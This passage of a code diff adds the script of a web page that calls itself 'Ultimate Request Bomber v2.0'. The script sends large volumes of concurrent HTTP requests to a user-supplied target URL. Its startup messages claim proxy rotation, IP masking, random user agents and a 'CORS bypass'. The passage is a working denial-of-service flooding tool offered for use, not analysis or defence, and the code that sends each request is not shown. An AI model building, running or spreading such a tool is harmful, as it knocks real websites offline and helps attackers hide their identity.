+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            document.getElementById(tabName).classList.add('active');
+            event.target.classList.add('active');
+        }
+
+        document.getElementById('method').addEventListener('change', function() {
+            document.getElementById('postDataGroup').style.display = 
+                ['POST', 'PUT', 'PATCH'].includes(this.value) ? 'block' : 'none';
+        });
+
+        // Main Attack Functions
+        async function startAttack() {
+            if (isAttacking) {
+                addTerminalLine('⚠️ Attack already in progress', 'warning');
+                return;
+            }
+
+            const config = getAttackConfig();
+            if (!validateConfig(config)) return;
+
+            initializeAttack(config);
+            
+            try {
+                await executeAdvancedAttack(config);
+            } catch (error) {
+                handleAttackError(error);
+            }
+        }
+
+        function getAttackConfig() {
+            return {
+                url: document.getElementById('url').value,
+                method: document.getElementById('method').value,
+                jumlah: parseInt(document.getElementById('jumlah').value),
+                delay: parseInt(document.getElementById('delay').value),
+                concurrent: parseInt(document.getElementById('concurrent').value),
+                data: document.getElementById('data').value,
+                headers: document.getElementById('headers').value,
+                use_proxy: document.getElementById('use_proxy').checked,
+                rotate_ips: document.getElementById('rotate_ips').checked,
+                bypass_cors: document.getElementById('bypass_cors').checked,
+                random_ua: document.getElementById('random_ua').checked,
+                engine: document.getElementById('engine').value
+            };
+        }
+
+        function validateConfig(config) {
+            if (!config.url) {
+                alert('❌ Please enter a target URL');
+                return false;
+            }
+            if (config.jumlah < 1 || config.jumlah > CONFIG.maxRequests) {
+                alert(`❌ Request count must be between 1 and ${CONFIG.maxRequests}`);
+                return false;
+            }
+            return true;
+        }
+
+        function initializeAttack(config) {
+            isAttacking = true;
+            currentRequest = 0;
+            totalRequests = config.jumlah;
+            successCount = 0;
+            failedCount = 0;
+            totalResponseTime = 0;
+            responseTimes = [];
+            abortController = new AbortController();
+
+            updateUIForAttack();
+            addTerminalLine('🚀 STARTING ADVANCED ATTACK...', 'command');
+            addTerminalLine(`🎯 Target: ${config.url}`, 'info');
+            addTerminalLine(`💣 Volume: ${config.jumlah} requests`, 'info');
+            addTerminalLine(`⚡ Concurrent: ${config.concurrent} threads`, 'info');
+            addTerminalLine(`🛡️ Proxy: ${config.use_proxy ? 'ENABLED' : 'DISABLED'}`, 'info');
+        }
+
+        async function executeAdvancedAttack(config) {
+            const requestSystem = new AdvancedRequestSystem();
+            const workers = [];
+            const requestsPerWorker = Math.ceil(config.jumlah / config.concurrent);
+
+            for (let i = 0; i < config.concurrent; i++) {
+                const start = i * requestsPerWorker;
+                const end = Math.min(start + requestsPerWorker, config.jumlah);
+                
+                if (start < config.jumlah) {
+                    workers.push(executeWorker(requestSystem, config, start, end, i));
+                }
+            }
+
+            await Promise.all(workers);
+            completeAttack('COMPLETED SUCCESSFULLY');
+        }
+
+        async function executeWorker(requestSystem, config, start, end, workerId) {
+            for (let i = start; i < end; i++) {
+                if (!isAttacking) break;
+
+                try {
+                    const result = await requestSystem.sendRequest(config);
+                    
+                    currentRequest++;
+                    if (result.success) {
+                        successCount++;
+                    } else {
+                        failedCount++;
+                    }
+                    totalResponseTime += result.responseTime;
+                    responseTimes.push(result.responseTime);
+
+                    updateStats();
+                    addResultToUI(currentRequest, result);
+                    addTerminalUpdate(currentRequest, result, workerId);
+
+                    // Intelligent delay
+                    if (i < end - 1 && config.delay > 0) {
+                        await new Promise(resolve => setTimeout(resolve, config.delay));
+                    }
+
+                } catch (error) {
+                    if (error.name !== 'AbortError') {
+                        currentRequest++;
+                        failedCount++;
+                        updateStats();
+                        addTerminalLine(`❌ Worker ${workerId}: ${error.message}`, 'error');
+                    }
+                    break;
+                }
+            }
+        }
+
+        function stopAttack() {
+            isAttacking = false;
+            if (abortController) {
+                abortController.abort();
+            }
+            updateUIForStop();
+            addTerminalLine('🛑 EMERGENCY STOP ACTIVATED', 'warning');
+        }
+
+        function updateUIForAttack() {
+            document.getElementById('statusDot').classList.remove('offline');
+            document.getElementById('statusText').textContent = 'ADVANCED ATTACK ACTIVE';
+            document.getElementById('statusSubtext').textContent = 'Military-grade system engaged';
+            document.querySelector('.btn-stop').style.display = 'block';
+            document.querySelector('.btn').style.display = 'none';
+            document.getElementById('resultsContainer').innerHTML = '';
+            updateStats();
+        }
+
+        function updateUIForStop() {
+            document.getElementById('statusText').textContent = 'SYSTEM STOPPED';
+            document.getElementById('statusSubtext').textContent = 'Ready for new operations';
+            document.getElementById('statusDot').classList.add('offline');
+            document.querySelector('.btn-stop').style.display = 'none';
+            document.querySelector('.btn').style.display = 'block';
+        }
+
+        function completeAttack(status) {
+            isAttacking = false;
+            document.getElementById('statusText').textContent = 'MISSION COMPLETE';
+            document.getElementById('statusSubtext').textContent = `Attack ${status}`;
+            document.getElementById('statusDot').classList.add('offline');
+            document.querySelector('.btn-stop').style.display = 'none';
+            document.querySelector('.btn').style.display = 'block';
+            
+            const avgTime = currentRequest > 0 ? Math.round(totalResponseTime / currentRequest) : 0;
+            const successRate = currentRequest > 0 ? Math.round((successCount / currentRequest) * 100) : 0;
+            
+            addTerminalLine('', 'system');
+            addTerminalLine('🎉 ATTACK COMPLETED!', 'command');
+            addTerminalLine(`✅ Successful: ${successCount} requests`, 'info');
+            addTerminalLine(`❌ Failed: ${failedCount} requests`, 'info');
+            addTerminalLine(`📊 Success Rate: ${successRate}%`, 'info');
+            addTerminalLine(`⚡ Average Response: ${avgTime}ms`, 'info');
+            addTerminalLine('🏁 System secured and ready', 'command');
+        }
+
+        function handleAttackError(error) {
+            addTerminalLine(`💥 CRITICAL ERROR: ${error.message}`, 'error');
+            updateUIForStop();
+        }
+
+        function updateStats() {
+            document.getElementById('statRequests').textContent = currentRequest.toLocaleString();
+            document.getElementById('statSuccess').textContent = successCount.toLocaleString();
+            document.getElementById('statFailed').textContent = failedCount.toLocaleString();
+            
+            const avgTime = currentRequest > 0 ? Math.round(totalResponseTime / currentRequest) : 0;
+            document.getElementById('statAvgTime').textContent = avgTime + 'ms';
+            
+            const progress = totalRequests > 0 ? (currentRequest / totalRequests) * 100 : 0;
+            document.getElementById('progressFill').style.width = progress + '%';
+            document.getElementById('progressText').textContent = Math.round(progress) + '%';
+
+            // Update chart
+            if (responseChart && responseTimes.length > 0) {
+                const labels = responseTimes.map((_, i) => (i + 1).toString());
+                responseChart.data.labels = labels.slice(-50);
+                responseChart.data.datasets[0].data = responseTimes.slice(-50);
+                responseChart.update('none');
+            }
+        }
+
+        function addResultToUI(requestId, result) {
+            const isSuccess = result.success;
+            const itemClass = isSuccess ? 'success' : 'error';
+            const statusIcon = isSuccess ? '✅' : '❌';
+            const statusText = isSuccess ? 'SUCCESS' : 'FAILED';
+            
+            const resultHTML = `
+                <div class="result-item ${itemClass}">
+                    <div style="display: flex; justify-content: space-between; align-items: start; margin-bottom: 8px;">
+                        <div style="flex: 1;">
+                            <strong>#${requestId}</strong> • 
+                            <span style="color: ${isSuccess ? 'var(--success)' : 'var(--danger)'}">
+                                ${statusIcon} ${statusText}
+                            </span> • 
+                            <span>⏱️ ${result.responseTime}ms</span>
+                            <span class="badge badge-info" style="margin-left: 8px;">${result.engineUsed}</span>
+                        </div>
+                        <div style="opacity: 0.7; font-size: 0.8rem;">${new Date().toLocaleTimeString()}</div>
+                    </div>
+                    <div style="font-size: 0.8rem; opacity: 0.9;">
+                        <strong>Status:</strong> ${result.status} ${result.status_text}
+                    </div>
+                    ${result.response ? `
+                    <div style="font-size: 0.75rem; opacity: 0.8; margin-top: 5px; font-family: monospace;">
+                        ${result.response}
+                    </div>
+                    ` : ''}
+                </div>
+            `;
+            
+            const container = document.getElementById('resultsContainer');
+            
+            if (container.children.length === 1 && container.children[0].style.textAlign) {
+                container.innerHTML = '';
+            }
+            
+            container.insertAdjacentHTML('afterbegin', resultHTML);
+            
+            if (container.children.length > 100) {
+                container.removeChild(container.lastChild);
+            }
+        }
+
+        function addTerminalUpdate(requestId, result, workerId) {
+            const status = result.success ? 'info' : 'error';
+            const icon = result.success ? '✅' : '❌';
+            addTerminalLine(`${icon} W${workerId}-R${requestId}: ${result.status} - ${result.responseTime}ms [${result.engineUsed}]`, status);
+        }
+
+        function addTerminalLine(text, type = 'info') {
+            const terminalBody = document.getElementById('terminalBody');
+            const line = document.createElement('div');
+            line.className = `terminal-line terminal-${type}`;
+            line.textContent = text;
+            terminalBody.appendChild(line);
+            terminalBody.scrollTop = terminalBody.scrollHeight;
+        }
+
+        // Initialize system
+        document.addEventListener('DOMContentLoaded', function() {
+            initChart();
+            document.getElementById('method').dispatchEvent(new Event('change'));
+            addTerminalLine('$ Ultimate Request Bomber v2.0 initialized', 'command');
+            addTerminalLine('> Vercel compatibility: VERIFIED', 'system');
+            addTerminalLine('> CORS bypass: ACTIVE', 'system');
+            addTerminalLine('> Proxy rotation: ENABLED', 'system');
+            addTerminalLine('> IP masking: OPERATIONAL', 'system');
+            addTerminalLine('$ Ready for advanced operations', 'command');
+        });
+    </script>
+</body>
+</html>
